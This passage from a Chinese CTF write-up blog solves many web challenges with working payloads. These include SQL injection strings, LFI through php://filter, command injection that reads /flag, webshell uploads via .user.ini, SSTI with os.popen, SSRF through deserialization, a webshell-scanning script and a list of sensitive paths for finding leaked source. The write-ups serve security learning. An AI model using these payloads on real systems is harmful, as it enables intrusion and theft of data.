0);*/........这一行是省略的代码........if(!empty($token)&amp;&amp;!empty($emailAddress)){ if(strlen($token)!=10) die('fail'); if($token!='0') die('fail'); $sql = &quot;SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'&quot;; $r = mysql_query($sql) or die('db error'); $r = mysql_fetch_assoc($r); $r = $r['num']; if($r&gt;0){ echo $flag; }else{ echo &quot;失败了呀&quot;; }} payload: `token=0e11111111&amp;emailAddress=admin@simplexue.com` 0x12 Once More简单概括： 考点：ereg函数%00截断，科学计数法 难度：易 WP：1e9%00*-* 解题过程：打开题目，得到题目源码：1234567891011121314151617181920212223&lt;?phpif (isset ($_GET['password'])) { if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET['password']) === FALSE) { echo '&lt;p&gt;You password must be alphanumeric&lt;/p&gt;'; } else if (strlen($_GET['password']) &lt; 8 &amp;&amp; $_GET['password'] &gt; 9999999) { if (strpos ($_GET['password'], '*-*') !== FALSE) { die('Flag: ' . $flag); } else { echo('&lt;p&gt;*-* have not been found&lt;/p&gt;'); } } else { echo '&lt;p&gt;Invalid password&lt;/p&gt;'; }}?&gt; 首先判断是否用过get方式传入password，其次判断是否只含有数字和字母，如果是则返回错误，接着判断长度小于8且大于9999999。看到这里估计就知道是要考科学计数法了，最后要求get的数据包含*-*。我们知道1E8就等于10000000，这样就可以满足长度小于8且大于9999999的条件，不过我们先得绕开判断只有数字和字母的条件，我们知道ereg函数可利用%00进行截断攻击，故我们的payload构造如下：?password=1e8%00*-*注意此处的%00只占一个字符的大小。 0x13 Guess Next Session简单概括： 考点：Session与Cookie绑定，PHP弱类型比较 难度：易 WP：删掉Cookie，?password= 解题过程：打开题目得到源码：1234567891011&lt;?phpsession_start(); if (isset ($_GET['password'])) { if ($_GET['password'] == $_SESSION['password']) die ('Flag: '.$flag); else print '&lt;p&gt;Wrong guess.&lt;/p&gt;';}mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));?&gt;创建session，通过get方式取password值再与session里的password值进行比较，这里我们不知道 session里的password值是多少的，而且我们并不能控制session，不过这里的比较是用==弱类型比较，猜想，如果我们将cookie删除，那么$_SESSION[‘password’]的值将为NULL，此时如果我们get传入的 password为空，即’’，那么比较结果即为true。payload:将cookie删除或禁用，接着访问?password= 0x14 FALSE简单概括： 考点：sha1,md5等传入数组返回Null，PHP弱类型比较 难度：易 WP：?name[]=1&amp;password[]=2 解题过程：打开题目获得源码：123456789101112&lt;?phpif (isset($_GET['name']) and isset($_GET['password'])) { if ($_GET['name'] == $_GET['password']) echo '&lt;p&gt;Your password can not be your name!&lt;/p&gt;'; else if (sha1($_GET['name']) === sha1($_GET['password'])) die('Flag: '.$flag); else echo '&lt;p&gt;Invalid password.&lt;/p&gt;';}else{ echo '&lt;p&gt;Login first!&lt;/p&gt;';?&gt;我们知道sha1()函数与md5()类似，当参数为数组时会返回NULL，如果我们传入的name与password为数组时无论其为什么值，都可以通过sha1($name)===sha1($password)的强类型判断。故我们的payload构造如下：?name[]=a&amp;password[]=b 0x15 上传绕过简单概括： 考点：目录名%00截断 难度：易 WP：/upload/1.php%00 解题过程：burp抓个上传包：首先尝试了文件名%00阶段，发现无用，然后看到了我们可以控制上传的目录名，猜测后台为获取目录名再与文件名拼接。如果我们的目录名存在截断漏洞，那么我们可以构造/uploads/1.php%00这样拼接的时候就只有目录名，达到getshell的目的。 0x16 NSCTF web200简单概括： 考点：逆加密过程 难度：易 WP：1234567部分：x = &quot;~88:36e1bg8438e41757d:29cgeb6e48c`GUDTO|;hbmg&quot;c = &quot;&quot;for a in x: b = ord(a) c += chr(b-1)print(c) 解题过程：打开题目：解密问题，按照加密过程反着解密即可。 0x17 程序逻辑问题简单概括： 考点：union select联合注入 难度：易 WP：user=123aaa%27+union+select+%27c4ca4238a0b923820dcc509a6f75849b&amp;pass=1 解题过程：打开题目，右键查看源代码得到题目源码：1234567891011121314151617181920212223242526272829303132333435363738394041&lt;html&gt;&lt;head&gt;welcome to simplexue&lt;/head&gt;&lt;body&gt;&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) { $conn = mysql_connect(&quot;********, &quot;*****&quot;, &quot;********&quot;); mysql_select_db(&quot;phpformysql&quot;) or die(&quot;Could not select database&quot;); if ($conn-&gt;connect_error) { die(&quot;Connection failed: &quot; . mysql_error($conn));} $user = $_POST[user];$pass = md5($_POST[pass]);$sql = &quot;select pw from php where user='$user'&quot;;$query = mysql_query($sql);if (!$query) { printf(&quot;Error: %s\\n&quot;, mysql_error($conn)); exit();}$row = mysql_fetch_array($query, MYSQL_ASSOC);//echo $row[&quot;pw&quot;]; if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) { echo &quot;&lt;p&gt;Logged in! Key:************** &lt;/p&gt;&quot;;}else { echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;); }}?&gt;&lt;form method=post action=index.php&gt;&lt;input type=text name=user value=&quot;Username&quot;&gt;&lt;input type=password name=pass value=&quot;Password&quot;&gt;&lt;input type=submit&gt;&lt;/form&gt;&lt;/body&gt;&lt;a href=&quot;index.txt&quot;&gt;&lt;/html&gt;strcasecmp()函数不分大小写进行字符串比较。首先我们不知道数据库里已有的用户值为多少，更不知其密码。不过我们可以通过构造联合查询注入来返回我们自定义的数据。payloadd:user=abc' union select 'c4ca4238a0b923820dcc509a6f75849b&amp;pass=11的md5为：c4ca4238a0b923820dcc509a6f75849b 0x18 what a fuck!这是什么鬼东西?简单概括： 考点：JSFUCK 难度：易 WP：复制代码到浏览器控制台执行即可 解题过程：复制粘贴进浏览器的js控制台，回车运行即可。 0x19 PHP大法简单概括： 考点：PHP自动解码机制 难度：易 WP：id=%2568ackerDJ 解题过程：打开题目，页面提示：index.php.txt，打开得到源码：123456789101112131415&lt;?phpif(eregi(&quot;hackerDJ&quot;,$_GET[id])) { echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;); exit();}$_GET[id] = urldecode($_GET[id]);if($_GET[id] == &quot;hackerDJ&quot;){ echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;; echo &quot;&lt;p&gt;flag: *****************} &lt;/p&gt;&quot;;}?&gt;&lt;br&gt;&lt;br&gt;Can you authenticate to this website? $_GET[id]在取到值后已经自动urldecode了一次，然而后边再用urldecode解码一次，故可以使用二次编码绕过前边的关键字检测。 0x1A 这个看起来有点简单!简单概括： 考点：Union无过滤注入 难度：易 WP：无 0x1B 貌似有点难简单概括： 考点：Header头IP伪造 难度：易 WP：无 0x1C 头有点大简单概括： 考点：UA头伪造 难度：易 WP：无 0x1D 猫抓老鼠简单概括： 考点：脑洞 难度：及其变态神经病的题目 WP：无 解题过程：查看访问请求返回头，发现有东西：将这串base64放到表单里提交即可。 0x1E 看起来有点难简单概括： 考点：时间盲注 难度：中 WP：sqlmap一把嗦","link":"/2019/%E7%99%BE%E9%81%93CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%B8%80)%E4%B9%8B%E5%AE%9E%E9%AA%8C%E5%90%A7/"},{"title":"百道CTF刷题记录(三)之BUUCTF","text":"前言接上篇，继续刷题。 刷题之旅[ACTF2020 新生赛]Include打开题目，可以看到有个tips的跳转链接，点击后跳转到： 1/?file=flag.php 结合题目猜测源码为： 123&lt;?phpinclude $_GET['file'];?&gt; 先用LFI读取index.php再说。 1/?file=php://filter/read=convert.base64-encode/resource=index.php 得到源码： 12345678910111213&lt;meta charset=&quot;utf8&quot;&gt;&lt;?phperror_reporting(0);$file = $_GET[&quot;file&quot;];if(stristr($file,&quot;php://input&quot;) || stristr($file,&quot;zip://&quot;) || stristr($file,&quot;phar://&quot;) || stristr($file,&quot;data:&quot;)){ exit('hacker!');}if($file){ include($file);}else{ echo '&lt;a href=&quot;?file=flag.php&quot;&gt;tips&lt;/a&gt;';}?&gt; 好像没有拦截flag关键字，直接用LFI读取flag.php即可。 1/?file=php://filter/read=convert.base64-encode/resource=flag.php [极客大挑战 2019]Knife打开题目，得到提示： 1eval($_POST[&quot;Syc&quot;]); 直接打开Webshell管理工具，这里我用蚁剑演示。 在根目录下发现flag文件，右键读取即可。 [极客大挑战 2019]Http打开题目，在HTML源代码处发现： 1&lt;a style=&quot;border:none;cursor:default;&quot; onclick=&quot;return false&quot; href=&quot;Secret.php&quot;&gt;氛围&lt;/a&gt; 访问Secret.php得到： 1It doesn't come from 'https://www.Sycsecret.com' 我们使用Burpsuite抓包修改请求头中的Referer字段，重放数据包得到： 1Please use &quot;Syclover&quot; browser 再修改User-Agent字段为Syclover，重放数据包得到： 1No!!! you can only read this locally!!! 最后修改X-Forwarded-For字段为127.0.0.1，重放数据包即可得到Flag。 Referer记录HTTP请求来源，可起到查看跳转来源、防CSRF等作用 User-Agent记录请求对应的浏览器信息，方便页面做相应的自适应等工作 X-Forwarded-For记录请求发送的代理IP信息，可伪造，PHP中通过$_SERVER['HTTP_X_FORWARD_FOR']获取，不收GPC魔术引号影响。 [ACTF2020 新生赛]Exec通过题目名称，简单判断为命令执行题。 老规矩，尝试列目录： 11;ls 返回： 12PING 1 (0.0.0.1): 56 data bytesindex.php 尝试读取index.php看看源代码怎样写的： 11;cat index.php 得到： 12345&lt;?php if (isset($_POST['target'])) { system(&quot;ping -c 3 &quot;.$_POST['target']);}?&gt; 没有黑名单等拦截方法，直接起飞，通常flag都在根目录，我们列出根目录的文件： 11;ls / 得到： 12345678910111213141516171819PING 1 (0.0.0.1): 56 data bytesbindevetcflaghomelibmediamntoptprocrootrunsbinsrvsystmpusrvar 读取flag文件： 11;cat /flag [SUCTF 2019]CheckIn打开题目，发现是道上传题。 我们先用Burp抓个上传数据包。正常上传图片发现可以成功上传： 12345678910Your dir uploads/adeee0c170ad4ffb110df0cde294aecd &lt;br&gt;Your files : &lt;br&gt;array(4) { [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(9) &quot;index.php&quot; [3]=&gt; string(8) &quot;test.jpg&quot;} 并返回上传路径与同目录下的文件信息，且上传名不变。 发现上传目录内存在php文件，猜测上传php应该能够解析，尝试php、php3、php3p、php4、php5、phtml、pht格式均不可上传，被黑名单拦截。 尝试Apache解析漏洞，上传test.php.xxx，发现解析错误，同样失败告终。 一番查阅后得知，可通过上传.user.ini文件来给同目录下的index.php文件添加上一些额外的内容。 1auto_prepend_file=xxx.jpg 此时，同目录下的index.php会相当于自动在头部require xxx.jpg，起到任意文件包含的作用。 先上传一个伪装成图片的webshell： 再上传.user.ini文件： 此时/uploads/adeee0c170ad4ffb110df0cde294aecd/index.php文件已自动包含上我们的test.jpg，成功一个webshell，我们可以直接连接上蚁剑，再读取flag即可。 何为GIF89a，图片格式gif必要文件头信息。 .user.ini，php配置文件之一，可配置一些php参数，可影响同目录或子目录的php文件，无需php重启。 &lt;script language='php'&gt;&lt;/script&gt;，php作用域的另一种表示方法，除此之外还有短字符&lt;? ?&gt;。 [极客大挑战 2019]BabySQLSQL注入题，此题过滤掉了一些危险关键字，使用双写绕过即可，如or关键字，双写为：oorr。 查表名： 1/check.php?username=1%27unioorn%20selecort%201,2,group_concat(table_name)%20froorm%20infoorrmation_schema.tables%20wheorre%20table_schema=database()%23&amp;password=1 差列名： 1/check.php?username=1%27unioorn%20selecort%201,2,group_concat(column_name)%20froorm%20infoorrmation_schema.columns%20wheorre%20table_schema=database()%20anord%20table_name=%27b4bsql%27%23&amp;password=1 读数据： 1/check.php?username=1%27unioorn%20selecort%201,2,group_concat(id,username,passwoorrd)%20froorm%20b4bsql%23&amp;password=1 [CISCN2019 华北赛区 Day2 Web1]Hack World打开题目，发现给了提示： 12All You Want Is In Table 'flag' and the column is 'flag'Now, just give the id of passage 输入正常数据1： 1Hello, glzjin wants a girlfriend. 老规矩，单引号走起1'，返回： 1bool(false) 易知此处应该属于盲注，题目所给出的信息应该是为了节省时间。 此处空格、*被拦截，使用一下方法绕过： %0a等其他不可见字符 多层括号嵌套 EXP： 1id=if(【判断条件】,1,2) 条件为真即返回：Hello, glzjin wants a girlfriend. 条件为假时返回：Do you want to be my girlfriend? 由于知道flag位置，我们直接判断数据长度然后逐位判断： 1id=if(length((select%0aflag%0afrom%0aflag))&gt;【长度】,1,2) 得到长度为42，接着读取数据： 注意Burp选择Cluster bomb模式，然后到Payloads区设置Payload。 Payload1选择数字模式，从1到42，步长为1。Payload2为a-z、0-9、{、}，由于-被拦截，故不添加。 注意在BUU复现时还需到Options区将线程数设置为1，否则会被BUU的WAF拦截。 最后将结果拼装即可，注意未直接判断出的位是符号-。 [极客大挑战 2019]Upload又一道上传题，尝试上传php文件，提示： 1NOT！php! 发现可以上传phtml文件： 修改上传内容为php内容后发现： 1NO! HACKER! your file included '&amp;#x3C;&amp;#x3F;' 提示禁止&lt;?，老套路了，修改为&lt;script language='php'&gt;&lt;/script&gt;的格式即可。 上传后尝试访问/test.phtml发现报错，估计上传目录不是根目录，直接盲猜一手upload，成功访问。 1/upload/test.phtml?a=system(%27cat%20/flag%27); [ACTF2020 新生赛]BackupFile打开题目，页面上给出提示： 1Try to find out source file! 写个脚本扫一下源码，附个简单的列表： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849/.svn//.DS_Store//.idea//.git/.index.php.swpindex.php.bak.flag.php.swpflag.phpconfig.phpfl4g.phpf14g.phpf1ag.phpwwwroot.rarwwwroot.zipwww.rarwww.zip/.git/HEAD/.git/index/.git/config/.git/description/README.MD/README.md/README/.gitignore/.svn/.svn/wc.db/.svn/entries/.hg/.ds_store/WEB-INF/web.xml/WEB-INF/src//WEB-INF/classes/WEB-INF/lib/WEB-INF/database.propertie/CVS/Root/CVS/Entries/.bzr//_viminfo/.viminfo/.save/.save1/.save2/.save3/.bak_Edietplus/.bak/.back/phpinfo.php/test.php/.bash_history 扫到源码：index.php.bak，下载下来查看： 12345678910111213141516171819&lt;?phpinclude_once &quot;flag.php&quot;;if(isset($_GET['key'])) { $key = $_GET['key']; if(!is_numeric($key)) { exit(&quot;Just num!&quot;); } $key = intval($key); $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;; if($key == $str) { echo $flag; }}else { echo &quot;Try to find out source file!&quot;;} $key == $str简单的弱类型比较绕过，/?key=123访问即可获得flag。 [极客大挑战 2019]BuyFlag打开题目，在pay.php页面处发现注释： 1234567891011&lt;!-- ~~~post money and password~~~if (isset($_POST['password'])) { $password = $_POST['password']; if (is_numeric($password)) { echo &quot;password can't be number&lt;/br&gt;&quot;; }elseif ($password == 404) { echo &quot;Password Right!&lt;/br&gt;&quot;; }}--&gt; 结合页面内容： 123If you want to buy the FLAG:You must be a student from CUIT!!!You must be answer the correct password!!! 用BurpSuite抓包后，在cookie处发现端倪：user=0，猜测修改为1之后才能满足：You must be a student from CUIT!!!。 password处为简单的PHP弱类型比较，要求不能输入数字又与数字404==比较成立。 右键选择Change request method改为POST型，添加上money与password参数：money=100000000&amp;password=404a，发送后返回you are Cuiter&lt;/br&gt;Password Right!&lt;/br&gt;Nember lenth is too long&lt;/br&gt;。 限制了长度，很明显可以通过科学计数法绕过，将money参数修改成：1e12即可。 1234567POST /pay.php HTTP/1.1Host: xxx.node3.buuoj.cnCookie: user=1Content-Type: application/x-www-form-urlencodedContent-Length: 24money=1e12&amp;password=404a [ACTF2020 新生赛]Upload简单上传题，上传phtml文件绕过即可。 [网鼎杯 2018]Fakebook打开题目，在join.php处发现注入，此处推荐报错注入，但我做的时候使用的布尔盲注。 爆表名，得表名users： 1username=1' and if(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)='',exp(4000),1)%23&amp;passwd=1&amp;age=1&amp;blog=http://www.baidu.com 爆列名，得列名no,username,passwd,data： 1username=1' and if(mid((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1)='',exp(4000),1)%23&amp;passwd=1&amp;age=1&amp;blog=http://www.baidu.com 发现并无flag字段，猜测考点应该不止SQL注入。 发现存在robots.txt文件，访问得到： 12User-agent: *Disallow: /user.php.bak 访问得到user.php的源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?phpclass UserInfo{ public $name = &quot;&quot;; public $age = 0; public $blog = &quot;&quot;; public function __construct($name, $age, $blog) { $this-&gt;name = $name; $this-&gt;age = (int)$age; $this-&gt;blog = $blog; } function get($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) { return 404; } curl_close($ch); return $output; } public function getBlogContents () { return $this-&gt;get($this-&gt;blog); } public function isValidBlog () { $blog = $this-&gt;blog; return preg_match(&quot;/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]{2,6}(\\:[0-9]+)?(\\/\\S*)?$/i&quot;, $blog); }} 发现此处存在SSRF漏洞。 在view.php?no=1发现SQL注入，注意此处有正则判断： 1view.php?no=-1%20union/**/select%201,2,3,4%20%23 返回错误： 1Notice: unserialize(): Error at offset 0 of 1 bytes in /var/www/html/view.php on line 31 猜测SQL数据为序列化之后的数据。 利用报错注入注出数据（concat函数被拦截）： 1view.php?no=1%20and%20updatexml(1,make_set(3,%27~%27,(select%20group_concat(data)%20from%20users)),1)%23 可以发现data数据为UserInfo类的序列化数据。 简单的反序列得能利用SSRF漏洞的EXP： 1O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;} 最后再view.php函数利用上此EXP即可： 1/view.php?no=1%20union/**/select%201,2,3,%27O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}%27%23 在源代码得到Iframe标签的Base64值，解码得到flag.php的内容： 12345&lt;?php$flag = &quot;flag{7d808a80-041e-40f2-b87f-89cfc4f86895}&quot;;exit(0); [ZJCTF 2019]NiZhuanSiWei打开题目得到首页源代码： 12345678910111213141516171819&lt;?php $text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];$password = $_GET[&quot;password&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,'r')===&quot;welcome to the zjctf&quot;)){ echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,'r').&quot;&lt;/h1&gt;&lt;/br&gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file)){ echo &quot;Not now!&quot;; exit(); }else{ include($file); //useless.php $password = unserialize($password); echo $password; }}else{ highlight_file(__FILE__);}?&gt; 稍显要绕过file_get_contents($text,'r')===&quot;welcome to the zjctf&quot;，由于我们并不知道满足条件的文件，故此处很容易可想到是要考LFI。 此处有两种方法pass： 使用data协议 使用php://input伪协议 第二处对变量$file进行了正则判断，使得我们无法直接LFI读flag。 通过旁边的注释//useless.php，我们先使用LFI读取其源码得： 123456789101112&lt;?php class Flag{ //flag.php public $file; public function __tostring(){ if(isset($this-&gt;file)){ echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;U R SO CLOSE !///COME ON PLZ&quot;); } } } ?&gt; 配合index.php文件的$password很容易知道最后一个考点是反序列化漏洞。 echo $password;会触发对象的__tostring魔法函数，从而执行代码，读取FLAG。 payload： 123451、GET: /?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:%22Flag%22:1:%7Bs:4:%22file%22;s:8:%22flag.php%22;%7D2、POST: /?text=php://input&amp;file=useless.php&amp;password=O:4:%22Flag%22:1:%7Bs:4:%22file%22;s:8:%22flag.php%22;%7Dwelcome to the zjctf [BJDCTF2020]Easy MD5打开题目发现从首页跳转到了：/leveldo4.php。 用抓包工具重放发现首页的跳转包无有用数据，而在/leveldo4.php请求的响应头出得到提示： 1Hint: select * from 'admin' where password=md5($pass,true) 这也是常考点了，在php中md5函数格式如下： 1string md5( string $str[, bool $raw_output = false] ) str 原始字符串。 raw_output 如果可选的 raw_output 被设置为 TRUE，那么 MD5 报文摘要将以16字节长度的原始二进制格式返回。 我们注意到，当raw_output为ture时返回是二进制格式，而md5函数的返回值为string类型，因此这里会隐式的将原始二进制格式数据转成字符串格式，这就造成了单引号逃逸的情况。 如经典的ffifdyop，经由md5($str, true)转换后得到：'or'6]!r,b，可以看到单引号被逃逸了出来，且拼接上了一个永真条件。 将ffifdyop提交后，页面跳转到新的地址：levels91.php。 在HTML源代码处得到提示： 1234567&lt;!--$a = $GET['a'];$b = $_GET['b'];if($a != $b &amp;&amp; md5($a) == md5($b)){ // wow, glzjin wants a girl friend.--&gt; 这里是弱类型比较考点。 简单的说就是”0e”开头的字符串在进行弱类型比较的时候会认为是科学计数法表示的数字。 所以0e545993274517709034328855841020相当于0*10^545993274517709034328855841020=0，与0e342768416822451524974117254469相同，也都是数字0。 所以&quot;0e545993274517709034328855841020&quot; == &quot;0e342768416822451524974117254469&quot;成立，也即：md5(&quot;s155964671a&quot;) == md5(&quot;s155964671a&quot;)成立。 下面列举几个相关的payload： 123456789101112s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675 通过后再次跳转至：levell14.php，打开页面即得到源代码： 123456789&lt;?phperror_reporting(0);include &quot;flag.php&quot;;highlight_file(__FILE__);if($_POST['param1']!==$_POST['param2']&amp;&amp;md5($_POST['param1'])===md5($_POST['param2'])){ echo $flag;} 这里使用了=== 强比较做判断，0e科学计数法的方法不再管用。 这里使用的是md5函数无法对数组类型的参数做处理，会返回NULL并产生一个WARNING级别的消息。 利用这个特点，我们POST如下数据即可通过： 1param1[]=1&amp;param2[]=2 [强网杯 2019]高明的黑客打开题目： 12雁过留声，人过留名，此网站已被黑我也是很佩服你们公司的开发，特地备份了网站源码到www.tar.gz以供大家观赏 把备份源码下载到本地： 发现里边有3002个php文件，随便打开一个发现代码都是乱七八糟的。 各种危险函数assert、eval等，不过都是被限制得死死的。 看来得需要我们编写脚本来一份一份得跑才行。 下面是我简单编写的多线程脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172# author: yunen# blog: https://www.0x002.com/import requests, threading, queue, os, re, timeFileQueue = queue.Queue()WebShellQueue = queue.Queue()evalPattern = &quot;\\$\\_(GET|POST)\\['(\\S+)'\\]&quot;path = r&quot;D:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\webshell&quot;class FileScan(threading.Thread): def run(self): while not FileQueue.empty(): file = FileQueue.get() with open(path + r&quot;\\\\\\\\&quot; + file, &quot;r&quot;, encoding=&quot;utf-8&quot;) as readfile: r = re.compile(evalPattern) for (method, variable) in r.findall(readfile.read()): WebShellQueue.put({ &quot;file&quot;: file, &quot;method&quot;: method, &quot;variable&quot;: variable })class CheckWebShell(threading.Thread): def run(self): while True: if not WebShellQueue.empty(): webShell = WebShellQueue.get() if webShell['file'][0:2] == 'xk': if webShell[&quot;method&quot;] == &quot;GET&quot;: r = requests.get(url=&quot;http://127.0.0.1/webshell/{}?{}=echo \\&quot;[*]\\&quot;&quot;.format(webShell['file'], webShell['variable'])) else: data = {webShell['variable']: &quot;echo \\&quot;[*]\\&quot;&quot;} r = requests.post(url=&quot;http://127.0.0.1/webshell/&quot; + webShell['file'], data=data) print(&quot;[-]Try: {}, Variable: {}&quot;.format(webShell['file'], webShell['variable'])) if &quot;[*]&quot; in r.text: print(&quot;[+]File found: {}, Variable: {}&quot;.format(webShell['file'], webShell['variable'])) WebShellQueue.queue.clear() breakdef main(): global FileQueue, WebShellQueue fileQueueList = [] webShellQueueList = [] for file in os.listdir(path): FileQueue.put(file) for i in range(10): th = FileScan() fileQueueList.append(th) th.start() time.sleep(10) for j in range(100): th = CheckWebShell() webShellQueueList.append(th) th.start() for th in fileQueueList: th.join() for th in webShellQueueList: th.join()if __name__ == '__main__': main() [BJDCTF 2nd]fake google打开题目，随便点了一下。 1/qaq?name={{7*7}} 页面返回49，简单就可以知道此题的考点应该就是ssti。 在网上找了一个payload，成功读取flag： 1/qaq?name={{a.__init__.__globals__.__builtins__.eval(&quot;__import__(%27os%27).popen(%27cat%20/flag%27).read()&quot;)}} 后语今天刚打完了CISCN，关于php的题还是做不来出来，审计与phptrick方面还是不清楚，看来还得多刷题多学习呀。","link":"/2020/%E7%99%BE%E9%81%93CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%B8%89)%E4%B9%8BBUUCTF/"},{"title":"百道CTF刷题记录(四)之BUUCTF","text":"前言接上篇，继续刷题 正文[极客大挑战 2019]HardSQL考点：报错注入。过滤了空白字符、=等 EXP： 12345678910# 取表名check.php?username=1&amp;password=1%27^updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)regexp(database())),0x7e),1)%23# 取列名check.php?username=1&amp;password=1%27^updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_schema)regexp(database())),0x7e),1)%23# 读数据check.php?username=1&amp;password=1%27^updatexml(1,concat(0x7e,(select(group_concat(id,password,username))from(H4rDsq1)),0x7e),1)%23# 读取不全使用right()取右边部分内容 [GXYCTF2019]BabySQli登录注入题。 老规矩，先分别使用单引号试报错，顺便看看pw参数有无带入数据库查询（与常见登录验证判断有关）。 尝试后发现，user参数报错，pw不报错。 猜测后端验证逻辑应该是先通过用户名查询数据库信息，再与pw参数做比较。 对于这种验证码方法我们通常采用联合注入法，通过控制返回内容来绕过登录。 EXP： 123POST /search.phpname=1'union select 1,'admin','202cb962ac59075b964b07152d234b70'%23&amp;pw=123 [RoarCTF 2019]Easy Java打开题目，发现页面存在一个奇怪链接： 1&lt;center&gt;&lt;p&gt;&lt;a href=&quot;Download?filename=help.docx&quot; target=&quot;_blank&quot;&gt;help&lt;/a&gt;&lt;/p&gt;&lt;/center&gt; 看样子应该是一个任意文件下载，只不过不知道能不能跨目录出去读取其他文件。 这里存在一个脑洞，直接GET会报错，改换POST访问才行。 1java.io.FileNotFoundException:{help.docx} 不过也是通过这个“脑洞”，让我们得知此题的后端程序是java。 我们知道，对于java的web开发，WEB-INF文件夹至关重要，其中的web.xml文件对要访问的文件进行相应映射才能访问。 /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class。/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。/WEB-INF/database.properties：数据库配置文件。 利用：通过找到web.xml文件，推断class文件路径，最后下载class文件，通过反编译class文件，得到网站源码。 摘自：Web源码泄露总结 故我们读取/WEB-INF/web.xml。 根据命名规则我们推断该class对应的字节码文件应存放在： 1/WEB-INF/classes/com/wm/ctf/FlagController.class 读取后得到flag： [网鼎杯 2020 青龙组]AreUSerialz打开题目，得到源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler { protected $op; protected $filename; protected $content; function __construct() { $op = &quot;1&quot;; $filename = &quot;/tmp/tmpfile&quot;; $content = &quot;Hello World!&quot;; $this-&gt;process(); } public function process() { if($this-&gt;op == &quot;1&quot;) { $this-&gt;write(); } else if($this-&gt;op == &quot;2&quot;) { $res = $this-&gt;read(); $this-&gt;output($res); } else { $this-&gt;output(&quot;Bad Hacker!&quot;); } } private function write() { if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) { if(strlen((string)$this-&gt;content) &gt; 100) { $this-&gt;output(&quot;Too long!&quot;); die(); } $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); } else { $this-&gt;output(&quot;Failed!&quot;); } } private function read() { $res = &quot;&quot;; if(isset($this-&gt;filename)) { $res = file_get_contents($this-&gt;filename); } return $res; } private function output($s) { echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; } function __destruct() { if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process(); }}function is_valid($s) { for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true;}if(isset($_GET{'str'})) { $str = (string)$_GET['str']; if(is_valid($str)) { $obj = unserialize($str); }} 简单的反序列题+LFI，关键就在于is_valid函数的绕过。 此函数限制了payload对应的ascii码区间范围。 若我们直接正常的使用如下payload： 12345678910111213&lt;?phpclass FileHandler { protected $op=&quot;2&quot;; //由于不知道flag的绝对路径，故无法直接读取flag，使用LFI读取即可 protected $filename=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;; protected $content=&quot;123&quot;;}$a = new FileHandler();echo urlencode(serialize($a));?&gt; 会发现payload中有不可见字符%00，该字符的ascii值是0，会被is_valid拦截。 法一：php7.1+版本对属性类型不敏感直接修改为public属性，EXP： 12345678910111213&lt;?phpclass FileHandler { public $op=&quot;2&quot;; //由于不知道flag的绝对路径，故无法直接读取flag，使用LFI读取即可 public $filename=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;; public $content=&quot;123&quot;;}$a = new FileHandler();echo urlencode(serialize($a));?&gt; 